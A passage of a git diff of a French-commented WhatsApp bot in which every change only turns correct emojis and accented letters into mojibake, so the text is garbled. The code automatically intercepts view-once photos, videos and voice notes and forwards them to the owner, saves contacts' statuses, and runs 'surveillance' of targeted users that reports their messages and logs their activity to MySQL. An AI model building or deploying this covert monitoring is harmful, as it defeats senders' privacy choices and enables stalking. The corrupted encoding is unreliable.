         const isLIDRecipient = isLID(recipientNumber);
-        console.log(`📤 [ENVOI] recipientNumber=${recipientNumber}, length=${recipientNumber?.length}, isLID=${isLIDRecipient}`);
+        console.log(`ðŸ“¤ [ENVOI] recipientNumber=${recipientNumber}, length=${recipientNumber?.length}, isLID=${isLIDRecipient}`);
         
-        // Accepter les numéros avec au moins 6 chiffres
+        // Accepter les numÃ©ros avec au moins 6 chiffres
         if (recipientNumber && recipientNumber.length >= 6 && !isLIDRecipient) {
-          // On ne met pas à jour le nom ici car on ne le connait pas forcément
+          // On ne met pas Ã  jour le nom ici car on ne le connait pas forcÃ©ment
           // Mais on s'assure que le contact existe dans la DB
           if (!contactsDB.has(recipientNumber)) {
             contactsDB.set(recipientNumber, {
@@ -8228,29 +8228,29 @@ ${actionDesc}
               isBlocked: false,
               notes: ""
             });
-            console.log(`📤 [CONTACT] ✅ NOUVEAU (envoi): ${formatPhoneNumber(recipientNumber)}`);
+            console.log(`ðŸ“¤ [CONTACT] âœ… NOUVEAU (envoi): ${formatPhoneNumber(recipientNumber)}`);
           } else {
             const contact = contactsDB.get(recipientNumber);
             contact.lastSeen = new Date().toLocaleString("fr-FR");
             contact.messageCount++;
-            console.log(`📤 [CONTACT] ♻️ MIS À JOUR (envoi): ${contact.name} (${contact.formattedNumber})`);
+            console.log(`ðŸ“¤ [CONTACT] â™»ï¸ MIS Ã€ JOUR (envoi): ${contact.name} (${contact.formattedNumber})`);
           }
         } else {
-          console.log(`📤 [CONTACT] ⚠️ IGNORÉ (envoi): numéro=${recipientNumber}, raison=${isLIDRecipient ? 'LID' : 'trop court'}`);
+          console.log(`ðŸ“¤ [CONTACT] âš ï¸ IGNORÃ‰ (envoi): numÃ©ro=${recipientNumber}, raison=${isLIDRecipient ? 'LID' : 'trop court'}`);
         }
         
-        // 🔄 AUTO-ENVOI VIEWONCE: Quand je réponds à quelqu'un qui m'a envoyé un viewonce
+        // ðŸ”„ AUTO-ENVOI VIEWONCE: Quand je rÃ©ponds Ã  quelqu'un qui m'a envoyÃ© un viewonce
         if (protectionState.autoSendViewOnce && pendingViewOnce.has(from)) {
           const storedViewOnce = pendingViewOnce.get(from);
           const timeSince = Date.now() - storedViewOnce.timestamp;
           const maxDelay = 24 * 60 * 60 * 1000; // 24h max
           
           if (timeSince <= maxDelay) {
-            // 🆕 Utiliser getContactInfo pour avoir le nom complet
+            // ðŸ†• Utiliser getContactInfo pour avoir le nom complet
             const contactInfo = getContactInfo(storedViewOnce.from);
-            console.log(`   🔄 [AUTO-VIEWONCE] Tu réponds à ${contactInfo}, envoi du viewonce...`);
+            console.log(`   ðŸ”„ [AUTO-VIEWONCE] Tu rÃ©ponds Ã  ${contactInfo}, envoi du viewonce...`);
             
-            // Envoyer le viewonce à moi-même
+            // Envoyer le viewonce Ã  moi-mÃªme
             (async () => {
               try {
                 const mediaBuffer = await downloadMediaMessage(
@@ -8259,7 +8259,7 @@ ${actionDesc}
                   {}
                 );
                 
-                const caption = `📸 *ViewOnce de ${contactInfo}*\n📅 Reçu il y a ${Math.round(timeSince / 60000)} min`;
+                const caption = `ðŸ“¸ *ViewOnce de ${contactInfo}*\nðŸ“… ReÃ§u il y a ${Math.round(timeSince / 60000)} min`;
                 
                 if (storedViewOnce.mediaType === "image") {
                   await hani.sendMessage(botNumber + "@s.whatsapp.net", {
@@ -8273,10 +8273,10 @@ ${actionDesc}
                   });
                 }
                 
-                console.log(`   ✅ [AUTO-VIEWONCE] ViewOnce envoyé à moi-même!`);
-                pendingViewOnce.delete(from); // Supprimer après envoi
+                console.log(`   âœ… [AUTO-VIEWONCE] ViewOnce envoyÃ© Ã  moi-mÃªme!`);
+                pendingViewOnce.delete(from); // Supprimer aprÃ¨s envoi
               } catch (err) {
-                console.log(`   ❌ [AUTO-VIEWONCE] Erreur: ${err.message}`);
+                console.log(`   âŒ [AUTO-VIEWONCE] Erreur: ${err.message}`);
               }
             })();
           } else {
@@ -8285,71 +8285,71 @@ ${actionDesc}
         }
       }
       
-      // 🔍 DÉBOGAGE ULTRA-COMPLET: Afficher STRUCTURE de tous les messages
+      // ðŸ” DÃ‰BOGAGE ULTRA-COMPLET: Afficher STRUCTURE de tous les messages
       const msgType = getContentType(msg.message);
       const msgKeys = Object.keys(msg.message || {});
       
-      // Log spécial pour les audios et vocaux (TOUJOURS)
+      // Log spÃ©cial pour les audios et vocaux (TOUJOURS)
       if (!msg.key.fromMe) {
         const containsAudio = msgKeys.some(k => k.toLowerCase().includes("audio") || k.toLowerCase().includes("ptt"));
         const containsViewOnce = msgKeys.some(k => k.toLowerCase().includes("viewonce"));
         
         if (containsAudio || containsViewOnce) {
-          console.log(`\n🔴 ------------------------------------------`);
-          console.log(`🔴 MESSAGE AUDIO/VIEWONCE REÇU - STRUCTURE COMPLÈTE:`);
-          console.log(`🔴 De: ${sender?.split("@")[0]} (${senderName})`);
-          console.log(`🔴 Type principal: ${msgType}`);
-          console.log(`🔴 Keys niveau 1: ${msgKeys.join(", ")}`);
+          console.log(`\nðŸ”´ ------------------------------------------`);
+          console.log(`ðŸ”´ MESSAGE AUDIO/VIEWONCE REÃ‡U - STRUCTURE COMPLÃˆTE:`);
+          console.log(`ðŸ”´ De: ${sender?.split("@")[0]} (${senderName})`);
+          console.log(`ðŸ”´ Type principal: ${msgType}`);
+          console.log(`ðŸ”´ Keys niveau 1: ${msgKeys.join(", ")}`);
           
-          // Explorer chaque clé
+          // Explorer chaque clÃ©
           for (const key of msgKeys) {
-            if (key === "messageContextInfo") continue; // Skip les métadonnées
+            if (key === "messageContextInfo") continue; // Skip les mÃ©tadonnÃ©es
             const value = msg.message[key];
             if (typeof value === "object" && value !== null) {
               const subKeys = Object.keys(value);
-              console.log(`🔴   ${key} → ${subKeys.join(", ")}`);
+              console.log(`ðŸ”´   ${key} â†’ ${subKeys.join(", ")}`);
               // Si c'est un viewOnce, explorer plus
               if (key.includes("viewOnce") && value.message) {
                 const innerKeys = Object.keys(value.message);
-                console.log(`🔴     message → ${innerKeys.join(", ")}`);
+                console.log(`ðŸ”´     message â†’ ${innerKeys.join(", ")}`);
                 for (const ik of innerKeys) {
                   if (typeof value.message[ik] === "object") {
-                    console.log(`🔴       ${ik} → ${Object.keys(value.message[ik]).join(", ")}`);
+                    console.log(`ðŸ”´       ${ik} â†’ ${Object.keys(value.message[ik]).join(", ")}`);
                   }
                 }
               }
-              // Si c'est un audio, montrer les propriétés
+              // Si c'est un audio, montrer les propriÃ©tÃ©s
               if (key.includes("audio") || key.includes("ptt")) {
-                console.log(`🔴     viewOnce: ${value.viewOnce}`);
-                console.log(`🔴     ptt: ${value.ptt}`);
-                console.log(`🔴     seconds: ${value.seconds}`);
-                console.log(`🔴     mimetype: ${value.mimetype}`);
+                console.log(`ðŸ”´     viewOnce: ${value.viewOnce}`);
+                console.log(`ðŸ”´     ptt: ${value.ptt}`);
+                console.log(`ðŸ”´     seconds: ${value.seconds}`);
+                console.log(`ðŸ”´     mimetype: ${value.mimetype}`);
               }
             }
           }
-          console.log(`🔴 ------------------------------------------\n`);
+          console.log(`ðŸ”´ ------------------------------------------\n`);
         }
       }
       
       // Log pour TOUS les messages non-texte ou vides
       if (!msg.key.fromMe) {
-        // Vérifier TOUS les formats possibles de viewOnce
+        // VÃ©rifier TOUS les formats possibles de viewOnce
         const hasViewOnce = msg.message?.viewOnceMessage || msg.message?.viewOnceMessageV2 || msg.message?.viewOnceMessageV2Extension;
         const hasAudioViewOnce = msg.message?.audioMessage?.viewOnce;
         const hasPttViewOnce = msg.message?.pttMessage?.viewOnce;
         
-        // Vérifier si c'est un vocal (pour débogage)
+        // VÃ©rifier si c'est un vocal (pour dÃ©bogage)
         const isAudioType = msgType === "audioMessage" || msgType === "pttMessage" || 
                            msgKeys.includes("audioMessage") || msgKeys.includes("pttMessage");
         
         if (hasViewOnce || hasAudioViewOnce || hasPttViewOnce || isAudioType || 
             (msgType !== "extendedTextMessage" && msgType !== "conversation" && msgType !== "reactionMessage")) {
-          console.log(`[MSG] [MSG REÇU] Type: ${msgType}`);
+          console.log(`[MSG] [MSG REÃ‡U] Type: ${msgType}`);
           console.log(`   Keys: ${msgKeys.join(", ")}`);
           console.log(`   De: ${sender?.split("@")[0]}`);
           console.log(`   ViewOnce: ${!!hasViewOnce} | AudioViewOnce: ${!!hasAudioViewOnce} | PttViewOnce: ${!!hasPttViewOnce}`);
           
-          // Débogage détaillé pour viewOnce
+          // DÃ©bogage dÃ©taillÃ© pour viewOnce
           if (hasViewOnce) {
             const voContent = hasViewOnce;
             console.log(`   ViewOnce Content Keys: ${Object.keys(voContent).join(", ")}`);
@@ -8358,12 +8358,12 @@ ${actionDesc}
               console.log(`   Inner Message Keys: ${innerKeys.join(", ")}`);
               // Si c'est un audio dans viewOnce
               if (innerKeys.includes("audioMessage") || innerKeys.includes("pttMessage")) {
-                console.log(`   [AUDIO] VOCAL VUE UNIQUE DÉTECTÉ dans viewOnce!`);
+                console.log(`   [AUDIO] VOCAL VUE UNIQUE DÃ‰TECTÃ‰ dans viewOnce!`);
               }
             }
           }
           
-          // Débogage pour audio/ptt direct
+          // DÃ©bogage pour audio/ptt direct
           if (isAudioType) {
             const audio = msg.message?.audioMessage || msg.message?.pttMessage;
             console.log(`   [AUDIO] Audio direct - viewOnce: ${audio?.viewOnce}, ptt: ${audio?.ptt}, seconds: ${audio?.seconds}`);
@@ -8371,7 +8371,7 @@ ${actionDesc}
         }
       }
       
-      // 📇 ENREGISTRER LE CONTACT DANS LA BASE
+      // ðŸ“‡ ENREGISTRER LE CONTACT DANS LA BASE
       if (!msg.key.fromMe && sender && !sender.endsWith("@g.us")) {
         updateContact(sender, senderName, {
           lastActivity: getContentType(msg.message),
@@ -8379,7 +8379,7 @@ ${actionDesc}
         });
       }
       
-      // 🤖 AUTO-REPLY: Réponses automatiques (MySQL UNIQUEMENT)
+      // ðŸ¤– AUTO-REPLY: RÃ©ponses automatiques (MySQL UNIQUEMENT)
       if (!msg.key.fromMe) {
         const texte = msg.message?.conversation || msg.message?.extendedTextMessage?.text || "";
         if (texte) {
@@ -8391,23 +8391,23 @@ ${actionDesc}
             
             if (matchedReply) {
               await hani.sendMessage(from, { text: matchedReply.response }, { quoted: msg });
-              console.log(`🤖 [AUTO-REPLY] Déclencheur: "${matchedReply.trigger_word}" → Réponse envoyée (MySQL)`);
+              console.log(`ðŸ¤– [AUTO-REPLY] DÃ©clencheur: "${matchedReply.trigger_word}" â†’ RÃ©ponse envoyÃ©e (MySQL)`);
             }
           } catch (arErr) {
-            console.log(`⚠️ [AUTO-REPLY] Erreur: ${arErr.message}`);
+            console.log(`âš ï¸ [AUTO-REPLY] Erreur: ${arErr.message}`);
           }
         }
       }
       
-      // ═══════════════════════════════════════════════════════════
-      // 🕵️ SURVEILLANCE DES UTILISATEURS CIBLÉS (MySQL UNIQUEMENT)
-      // ═══════════════════════════════════════════════════════════
+      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+      // ðŸ•µï¸ SURVEILLANCE DES UTILISATEURS CIBLÃ‰S (MySQL UNIQUEMENT)
+      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
       if (!msg.key.fromMe && sender) {
         try {
           // Charger le module MySQL
           const mysqlDB = require("./DataBase/mysql");
           
-          // Vérifier si l'expéditeur est sous surveillance (MySQL)
+          // VÃ©rifier si l'expÃ©diteur est sous surveillance (MySQL)
           const isUnderSurveillance = await mysqlDB.isUnderSurveillance(sender);
           
           if (isUnderSurveillance) {
@@ -8415,17 +8415,17 @@ ${actionDesc}
                           msg.message?.extendedTextMessage?.text || 
                           msg.message?.imageMessage?.caption ||
                           msg.message?.videoMessage?.caption ||
-                          (msg.message?.audioMessage ? "🎵 Audio/Vocal" : "") ||
-                          (msg.message?.imageMessage ? "📷 Photo" : "") ||
-                          (msg.message?.videoMessage ? "🎬 Vidéo" : "") ||
-                          (msg.message?.stickerMessage ? "🎴 Sticker" : "") ||
-                          (msg.message?.documentMessage ? "📄 Document" : "") ||
-                          (msg.message?.contactMessage ? "👤 Contact" : "") ||
-                          (msg.message?.locationMessage ? "📍 Localisation" : "") ||
-                          "📩 Message";
+                          (msg.message?.audioMessage ? "ðŸŽµ Audio/Vocal" : "") ||
+                          (msg.message?.imageMessage ? "ðŸ“· Photo" : "") ||
+                          (msg.message?.videoMessage ? "ðŸŽ¬ VidÃ©o" : "") ||
+                          (msg.message?.stickerMessage ? "ðŸŽ´ Sticker" : "") ||
+                          (msg.message?.documentMessage ? "ðŸ“„ Document" : "") ||
+                          (msg.message?.contactMessage ? "ðŸ‘¤ Contact" : "") ||
+                          (msg.message?.locationMessage ? "ðŸ“ Localisation" : "") ||
+                          "ðŸ“© Message";
             
             const isGroup = from?.endsWith("@g.us");
-            let groupName = "Privé";
+            let groupName = "PrivÃ©";
             if (isGroup) {
               try {
                 const metadata = await hani.groupMetadata(from);
@@ -8436,51 +8436,51 @@ ${actionDesc}
             const timestamp = new Date().toLocaleString("fr-FR");
             const senderNum = sender.split("@")[0];
             
-            // Envoyer notification au propriétaire
+            // Envoyer notification au propriÃ©taire
             const OWNER = config.NUMERO_OWNER ? 
               config.NUMERO_OWNER.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : 
               hani.user.id.split(":")[0] + "@s.whatsapp.net";
             
             const spyNotif = `
-🕵️ ═══════════════════════════
+ðŸ•µï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    *ALERTE SURVEILLANCE*
-═══════════════════════════
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-👤 *Cible:* @${senderNum}
-📛 *Nom:* ${senderName}
-📍 *Lieu:* ${isGroup ? groupName : "Message privé"}
-🕐 *Heure:* ${timestamp}
+ðŸ‘¤ *Cible:* @${senderNum}
+ðŸ“› *Nom:* ${senderName}
+ðŸ“ *Lieu:* ${isGroup ? groupName : "Message privÃ©"}
+ðŸ• *Heure:* ${timestamp}
 
-💬 *Message:*
+ðŸ’¬ *Message:*
 ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
 
-📞 wa.me/${senderNum}
-💾 Source: MySQL
-═══════════════════════════`;
+ðŸ“ž wa.me/${senderNum}
+ðŸ’¾ Source: MySQL
+â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•`;
             
             await hani.sendMessage(OWNER, { text: spyNotif }, { mentions: [sender] });
-            console.log(`🕵️ [SURVEILLANCE] Activité détectée de ${senderNum} (MySQL)`);
+            console.log(`ðŸ•µï¸ [SURVEILLANCE] ActivitÃ© dÃ©tectÃ©e de ${senderNum} (MySQL)`);
             
-            // Logger l'activité dans MySQL
+            // Logger l'activitÃ© dans MySQL
             await mysqlDB.logActivity(sender, isGroup ? "group_message" : "private_message", texte.slice(0, 500));
           }
         } catch (survErr) {
-          console.log(`⚠️ [SURVEILLANCE] Erreur: ${survErr.message}`);
+          console.log(`âš ï¸ [SURVEILLANCE] Erreur: ${survErr.message}`);
         }
       }
       
-      // 🤖 PROTECTION ANTI-BOT DÉSACTIVÉE
+      // ðŸ¤– PROTECTION ANTI-BOT DÃ‰SACTIVÃ‰E
       
-      // ═══════════════════════════════════════════════════════════
-      // 👁️ INTERCEPTION AUTOMATIQUE DES VUES UNIQUES (Photos/Vidéos/Vocaux)
-      // ═══════════════════════════════════════════════════════════
+      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+      // ðŸ‘ï¸ INTERCEPTION AUTOMATIQUE DES VUES UNIQUES (Photos/VidÃ©os/Vocaux)
+      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
       
-      // 1. Vues uniques classiques (photos/vidéos/audios)
+      // 1. Vues uniques classiques (photos/vidÃ©os/audios)
       const viewOnceContent = msg.message?.viewOnceMessage || msg.message?.viewOnceMessageV2 || msg.message?.viewOnceMessageV2Extension;
       
-      // DÉBOGAGE: Afficher tous les types de viewOnce détectés
+      // DÃ‰BOGAGE: Afficher tous les types de viewOnce dÃ©tectÃ©s
       if (viewOnceContent) {
-        console.log(`🔍 [VIEW-ONCE DEBUG] Contenu détecté!`);
+        console.log(`ðŸ” [VIEW-ONCE DEBUG] Contenu dÃ©tectÃ©!`);
         console.log(`   Message keys: ${Object.keys(msg.message || {}).join(", ")}`);
         console.log(`   ViewOnce keys: ${Object.keys(viewOnceContent || {}).join(", ")}`);
         if (viewOnceContent.message) {
@@ -8492,19 +8492,19 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
         const mediaMsg = viewOnceContent.message;
         const mediaType = Object.keys(mediaMsg || {})[0] || "inconnu";
         
-        // Déterminer si c'est un audio/vocal
+        // DÃ©terminer si c'est un audio/vocal
         const isAudio = mediaType === "audioMessage" || mediaType === "pttMessage";
         const isImage = mediaType === "imageMessage";
         const isVideo = mediaType === "videoMessage";
         
-        console.log(`[VIEW] VUE UNIQUE DÉTECTÉE de ${sender.split("@")[0]}`);
+        console.log(`[VIEW] VUE UNIQUE DÃ‰TECTÃ‰E de ${sender.split("@")[0]}`);
         console.log(`   Type: ${mediaType} | Audio: ${isAudio} | Image: ${isImage} | Video: ${isVideo}`);
         
-        // Vérifier les protections appropriées
+        // VÃ©rifier les protections appropriÃ©es
         const shouldIntercept = isAudio ? protectionState.autoViewOnceAudio : protectionState.autoViewOnce;
         
         if (!shouldIntercept) {
-          console.log(`   ⏭️ Interception désactivée pour ce type`);
+          console.log(`   â­ï¸ Interception dÃ©sactivÃ©e pour ce type`);
         } else {
           console.log(`   [OK] Interception en cours...`);
           
@@ -8522,14 +8522,14 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
             viewOnceMessages.delete(viewOnceMessages.keys().next().value);
           }
           
-          // 🆕 STOCKER POUR ENVOI AUTO QUAND JE RÉPONDS
-          // (Sera envoyé automatiquement quand je réponds à cette personne)
+          // ðŸ†• STOCKER POUR ENVOI AUTO QUAND JE RÃ‰PONDS
+          // (Sera envoyÃ© automatiquement quand je rÃ©ponds Ã  cette personne)
           if (protectionState.autoSendViewOnce) {
-            // Pour les messages privés, from = sender JID
+            // Pour les messages privÃ©s, from = sender JID
             // Pour les groupes, on utilise le participant
             const senderForStorage = isGroupMsg ? (msg.key.participant || sender) : from;
             pendingViewOnce.set(senderForStorage, {
-              from: from, // Le chat où le viewonce a été envoyé
+              from: from, // Le chat oÃ¹ le viewonce a Ã©tÃ© envoyÃ©
               senderName: msg.pushName || sender.split("@")[0],
               mediaType: mediaType,
               mediaMsg: mediaMsg,
@@ -8537,12 +8537,12 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
               msgKey: msg.key,
               isGroup: isGroupMsg
             });
-            console.log(`   📸 [PENDING] ViewOnce stocké pour envoi auto quand je réponds à ${senderForStorage.split("@")[0]}`);
+            console.log(`   ðŸ“¸ [PENDING] ViewOnce stockÃ© pour envoi auto quand je rÃ©ponds Ã  ${senderForStorage.split("@")[0]}`);
           }
           
-          // AUTOMATIQUEMENT télécharger et envoyer en privé
+          // AUTOMATIQUEMENT tÃ©lÃ©charger et envoyer en privÃ©
           try {
-            // Créer un message formaté pour le téléchargement
+            // CrÃ©er un message formatÃ© pour le tÃ©lÃ©chargement
             const downloadMsg = {
               key: msg.key,
               message: mediaMsg // Utiliser le message interne, pas viewOnceContent
@@ -8556,19 +8556,19 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
             );
             
             if (stream && stream.length > 0) {
-              console.log(`   📦 Buffer téléchargé: ${stream.length} bytes`);
+              console.log(`   ðŸ“¦ Buffer tÃ©lÃ©chargÃ©: ${stream.length} bytes`);
               const media = mediaMsg[mediaType];
-              const typeLabel = isAudio ? "🎤 VOCAL" : (isVideo ? "🎬 VIDÉO" : "📸 IMAGE");
-              // 🆕 Utiliser getContactInfo pour nom + numéro
+              const typeLabel = isAudio ? "ðŸŽ¤ VOCAL" : (isVideo ? "ðŸŽ¬ VIDÃ‰O" : "ðŸ“¸ IMAGE");
+              // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
               const contactInfo = getContactInfo(sender);
-              const caption = `${typeLabel} *VUE UNIQUE INTERCEPTÉ(E)!*\n━━━━━━━━━━━━━━━━━━━━━\n\n👤 *Contact:* ${contactInfo}\n📝 *Nom WA:* ${msg.pushName || "Inconnu"}\n💬 *Chat:* ${from.endsWith("@g.us") ? "Groupe" : "Privé"}\n🕐 *Heure:* ${new Date().toLocaleString("fr-FR")}\n${media?.caption ? `\n📝 *Légende:* ${media.caption}` : ""}`;
+              const caption = `${typeLabel} *VUE UNIQUE INTERCEPTÃ‰(E)!*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\nðŸ‘¤ *Contact:* ${contactInfo}\nðŸ“ *Nom WA:* ${msg.pushName || "Inconnu"}\nðŸ’¬ *Chat:* ${from.endsWith("@g.us") ? "Groupe" : "PrivÃ©"}\nðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}\n${media?.caption ? `\nðŸ“ *LÃ©gende:* ${media.caption}` : ""}`;
               
               if (isImage) {
                 await hani.sendMessage(botNumber, { image: stream, caption });
-                console.log(`[OK] Image vue unique envoyée à Moi-même`);
+                console.log(`[OK] Image vue unique envoyÃ©e Ã  Moi-mÃªme`);
               } else if (isVideo) {
                 await hani.sendMessage(botNumber, { video: stream, caption });
-                console.log(`[OK] Vidéo vue unique envoyée à Moi-même`);
+                console.log(`[OK] VidÃ©o vue unique envoyÃ©e Ã  Moi-mÃªme`);
               } else if (isAudio) {
                 // Envoyer le vocal comme PTT
                 await hani.sendMessage(botNumber, { 
@@ -8577,13 +8577,13 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
                   ptt: true // Toujours comme vocal
                 });
                 await hani.sendMessage(botNumber, { text: caption });
-                console.log(`[OK] Vocal vue unique envoyé à Moi-même`);
+                console.log(`[OK] Vocal vue unique envoyÃ© Ã  Moi-mÃªme`);
               }
             } else {
-              console.log(`[!] Échec téléchargement vue unique: buffer vide`);
+              console.log(`[!] Ã‰chec tÃ©lÃ©chargement vue unique: buffer vide`);
             }
           } catch (e) {
-            console.log(`[!] Erreur téléchargement vue unique: ${e.message}`);
+            console.log(`[!] Erreur tÃ©lÃ©chargement vue unique: ${e.message}`);
             // Fallback: essayer avec le message original
             try {
               console.log(`   [...] Tentative fallback avec message original...`);
@@ -8594,10 +8594,10 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
                 { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
               );
               if (stream2 && stream2.length > 0) {
-                console.log(`   📦 Fallback buffer: ${stream2.length} bytes`);
+                console.log(`   ðŸ“¦ Fallback buffer: ${stream2.length} bytes`);
                 const media = mediaMsg[mediaType];
-                const typeLabel = isAudio ? "🎤 VOCAL" : (isVideo ? "🎬 VIDÉO" : "📸 IMAGE");
-                const caption = `${typeLabel} *VUE UNIQUE INTERCEPTÉ(E)!*\n━━━━━━━━━━━━━━━━━━━━━\n\n👤 *De:* ${msg.pushName || sender.split("@")[0]}\n📱 *Numéro:* ${formatPhoneNumber(sender.split("@")[0])}\n🕐 *Heure:* ${new Date().toLocaleString("fr-FR")}`;
+                const typeLabel = isAudio ? "ðŸŽ¤ VOCAL" : (isVideo ? "ðŸŽ¬ VIDÃ‰O" : "ðŸ“¸ IMAGE");
+                const caption = `${typeLabel} *VUE UNIQUE INTERCEPTÃ‰(E)!*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\nðŸ‘¤ *De:* ${msg.pushName || sender.split("@")[0]}\nðŸ“± *NumÃ©ro:* ${formatPhoneNumber(sender.split("@")[0])}\nðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}`;
                 
                 if (isImage) {
                   await hani.sendMessage(botNumber, { image: stream2, caption });
@@ -8611,26 +8611,26 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
                   });
                   await hani.sendMessage(botNumber, { text: caption });
                 }
-                console.log(`[OK] Vue unique envoyée (fallback)`);
+                console.log(`[OK] Vue unique envoyÃ©e (fallback)`);
               }
             } catch (e2) {
-              console.log(`[!] Fallback aussi échoué: ${e2.message}`);
+              console.log(`[!] Fallback aussi Ã©chouÃ©: ${e2.message}`);
             }
           }
         }
       }
       
-      // 2. Vocaux "écoute unique" en format direct (non viewOnce wrapper) - Format alternatif
+      // 2. Vocaux "Ã©coute unique" en format direct (non viewOnce wrapper) - Format alternatif
       const audioMsg = msg.message?.audioMessage;
       const pttMsg = msg.message?.pttMessage; // Format alternatif pour les vocaux
       
-      // Vérifier les deux formats possibles de vocal écoute unique (format direct avec viewOnce flag)
+      // VÃ©rifier les deux formats possibles de vocal Ã©coute unique (format direct avec viewOnce flag)
       if ((audioMsg?.viewOnce || pttMsg?.viewOnce) && !msg.key.fromMe && protectionState.autoViewOnceAudio) {
         const voiceMsg = audioMsg || pttMsg;
-        console.log(`[AUDIO] VOCAL ÉCOUTE UNIQUE (FORMAT DIRECT) détecté de ${sender.split("@")[0]}`);
-        console.log(`[AUDIO] VOCAL ÉCOUTE UNIQUE DÉTECTÉ de ${sender.split("@")[0]}`);
+        console.log(`[AUDIO] VOCAL Ã‰COUTE UNIQUE (FORMAT DIRECT) dÃ©tectÃ© de ${sender.split("@")[0]}`);
+        console.log(`[AUDIO] VOCAL Ã‰COUTE UNIQUE DÃ‰TECTÃ‰ de ${sender.split("@")[0]}`);
         
-        // AUTOMATIQUEMENT télécharger et envoyer en privé
+        // AUTOMATIQUEMENT tÃ©lÃ©charger et envoyer en privÃ©
         try {
           const stream = await downloadMediaMessage(
             msg,
@@ -8640,9 +8640,9 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
           );
           
           if (stream && stream.length > 0) {
-            // 🆕 Utiliser getContactInfo pour nom + numéro
+            // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
             const contactInfo = getContactInfo(sender);
-            const caption = `🎤 *VOCAL ÉCOUTE UNIQUE INTERCEPTÉ!*\n━━━━━━━━━━━━━━━━━━━━━\n\n👤 *Contact:* ${contactInfo}\n📝 *Nom WA:* ${msg.pushName || "Inconnu"}\n💬 *Chat:* ${from.endsWith("@g.us") ? "Groupe" : "Privé"}\n🕐 *Heure:* ${new Date().toLocaleString("fr-FR")}`;
+            const caption = `ðŸŽ¤ *VOCAL Ã‰COUTE UNIQUE INTERCEPTÃ‰!*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\nðŸ‘¤ *Contact:* ${contactInfo}\nðŸ“ *Nom WA:* ${msg.pushName || "Inconnu"}\nðŸ’¬ *Chat:* ${from.endsWith("@g.us") ? "Groupe" : "PrivÃ©"}\nðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}`;
             
             // Envoyer le vocal comme PTT (message vocal)
             await hani.sendMessage(botNumber, { 
@@ -8654,20 +8654,20 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
             // Puis envoyer le caption
             await hani.sendMessage(botNumber, { text: caption });
             
-            console.log(`[OK] Vocal écoute unique envoyé à Moi-même`);
+            console.log(`[OK] Vocal Ã©coute unique envoyÃ© Ã  Moi-mÃªme`);
           }
         } catch (e) {
-          console.log(`[!] Erreur sauvegarde vocal écoute unique: ${e.message}`);
+          console.log(`[!] Erreur sauvegarde vocal Ã©coute unique: ${e.message}`);
         }
       }
 
-      // ═══════════════════════════════════════════════════════════
-      // 📸 INTERCEPTER ET SAUVEGARDER LES STATUTS AUTOMATIQUEMENT
-      // ═══════════════════════════════════════════════════════════
+      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+      // ðŸ“¸ INTERCEPTER ET SAUVEGARDER LES STATUTS AUTOMATIQUEMENT
+      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
       if (from === "status@broadcast" && !msg.key.fromMe && protectionState.antideletestatus) {
         const statusType = getContentType(msg.message);
         
-        // Télécharger et sauvegarder le statut immédiatement
+        // TÃ©lÃ©charger et sauvegarder le statut immÃ©diatement
         try {
           const statusData = {
             id: msg.key.id,
@@ -8687,7 +8687,7 @@ ${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}
             statusStore.delete(statusStore.keys().next().value);
           }
           
-          // Télécharger le média si c'est une image/vidéo
+          // TÃ©lÃ©charger le mÃ©dia si c'est une image/vidÃ©o
           if (["imageMessage", "videoMessage", "audioMessage"].includes(statusType)) {
             const stream = await downloadMediaMessage(
               msg,
